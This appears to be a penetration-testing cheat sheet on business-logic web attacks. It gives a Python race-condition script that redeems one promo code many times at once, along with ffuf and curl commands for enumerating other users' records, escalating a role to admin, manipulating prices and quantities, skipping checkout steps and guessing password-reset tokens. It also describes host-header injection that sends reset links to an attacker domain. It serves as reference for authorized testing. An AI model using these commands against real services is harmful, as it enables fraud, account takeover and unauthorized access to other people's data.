#web #business-logic #race-condition #idor

# Business Logic & Race Conditions

Related: [web-attacks](web-attacks.md) · [auth-attacks](auth-attacks.md) · [http-attacks](http-attacks.md)

## Race Conditions (Single-Packet Attack)
```python
import socket, ssl, threading

def send_req(host, raw):
    s = socket.create_connection((host, 443))
    ctx = ssl.create_default_context()
    s = ctx.wrap_socket(s, server_hostname=host)
    s.sendall(raw)
    s.recv(4096)
    s.close()

req = b"POST /redeem HTTP/1.1\r\nHost: target.com\r\nContent-Length: 20\r\n\r\ncode=SAME_PROMO_CODE"
threads = [threading.Thread(target=send_req, args=('target.com', req)) for _ in range(30)]
[t.start() for t in threads]
```
Fire many identical requests near-simultaneously so they land in the same server-side processing window before the first one's state check (balance, stock, promo-redeemed flag) commits — classic TOCTOU on a limit-checking endpoint (coupon redemption, wallet withdrawal, vote submission).

```text
Burp Suite: Turbo Intruder, race condition HTTP/2 single-packet attack template
```
In practice, use Burp's Turbo Intruder (`race-single-packet-attack.py` template) or the `ffuf -c` concurrent-request mode over raw sockets — HTTP/2 lets you queue all requests in one TCP packet, maximizing the race window (PortSwigger's technique).

## IDOR / BOLA (Broken Object-Level Authorization)
```bash
ffuf -u https://target.com/api/orders/FUZZ -H "Authorization: Bearer <low-priv-token>" -w ids.txt -mc 200
```
Iterate object IDs under a low-privilege token; any `200` on another user's resource (order, invoice, profile) is a BOLA finding. Also test with **no** token and with a token from a *different* tenant/org for multi-tenant apps.

```bash
curl -X GET "https://target.com/api/v1/users/1234/profile" -H "Authorization: Bearer <token>"
```
Check both sequential numeric IDs and predictable non-numeric ones (UUIDs leaked elsewhere in the app, email-derived IDs).

## Mass Assignment
```bash
curl -X PATCH https://target.com/api/users/me -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"name":"test","role":"admin","isVerified":true}'
```
APIs that blindly bind the request body to a model often accept fields the UI never exposes — `role`, `isAdmin`, `isVerified`, `price`, `balance` are the usual candidates. Diff the full object schema (from docs/other endpoints) against what the edit form actually submits.

## Price / Quantity Manipulation
```bash
curl -X POST https://target.com/api/cart/add -d '{"item_id":42,"quantity":-5,"price":0.01}'
```
Negative quantities (credit the cart instead of debiting stock), client-trusted price fields, and currency/precision mismatches (e.g. submitting `0.001` where the backend rounds to `0.00`) are all classic e-commerce logic bugs. Always resubmit with price/total fields the client-side JS computed but the server should be recalculating itself.

## Workflow / Step-Skipping
```bash
curl -X POST https://target.com/api/checkout/complete -H "Authorization: Bearer <token>" -d '{"order_id":1001}'
```
Call a later-stage endpoint (payment-complete, order-ship, account-approve) directly, skipping the UI steps meant to gate it (payment verification, email confirmation, admin approval) — works whenever the server trusts that reaching step N means steps 1..N-1 already happened server-side rather than re-checking state.

## Password Reset / Token Logic Flaws
```bash
curl -X POST https://target.com/api/reset-password -d '{"email":"victim@target.com","token":"0000"}'
```
Test reset tokens for: predictability (sequential/timestamp-derived), no expiry, no single-use enforcement, and host-header injection in the reset-link email (`Host: attacker.com` → victim receives a reset link pointing at your domain). See [auth-attacks](auth-attacks.md) and [http-attacks](http-attacks.md).
